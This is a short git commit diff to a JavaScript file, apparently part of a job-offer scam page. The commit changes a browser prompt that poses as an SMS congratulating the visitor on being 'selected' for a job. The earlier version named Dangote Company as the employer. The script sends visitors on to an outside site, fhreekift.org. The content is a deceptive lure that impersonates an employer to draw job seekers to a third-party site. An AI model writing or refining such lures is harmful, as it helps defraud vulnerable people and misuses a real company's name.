b9398660b4fedb3dbb588fc51cc7820b17b72efa
mfednewblog9 <newekpeitid@gmail.com>
2026-01-01 16:11:13 +0100

    Update active-job.js

--- active-job.js
+++ active-job.js
@@ -1,5 +1,5 @@
 var password = 'APPLY NOW'
-password=prompt('SMS: Congratulation. You are among the selection ones to work in one of the Dangote Company, kindly press Ok to submit application ','APPLY NOW');
+password=prompt('SMS: Congratulation. You have been selected to work as AD-HOC STAFF, kindly press Ok to submit application ','APPLY NOW');
 if (password != 'APPLY NOW') {
 location.href='https://fhreekift.org/jobs.html';
 }
